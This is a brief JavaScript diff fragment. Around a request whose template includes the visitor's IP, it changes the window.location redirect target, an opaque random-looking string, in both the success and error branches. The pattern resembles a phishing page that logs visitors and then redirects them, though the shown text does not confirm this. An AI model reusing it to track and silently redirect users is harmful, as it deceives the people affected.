@@ -48,10 +48,10 @@ IP: '${ip}'
                         },
                     })
                         .then(() => {
-                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms2';
+                            window.location = 'Kt9Po6Wm3Lf1Xq7Yv2Ub4Jo0Md8Ns5Tr3Gn5Qa9CCw1Bn3Kv9Rp2Lk0Wb6Xt4Je3Mv1Ho8FsNy';
                         })
                         .catch((error) => {
-                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms2';
+                            window.location = 'Kt9Po6Wm3Lf1Xq7Yv2Ub4Jo0Md8Ns5Tr3Gn5Qa9CCw1Bn3Kv9Rp2Lk0Wb6Xt4Je3Mv1Ho8FsNy';
                         });
                 });
         }
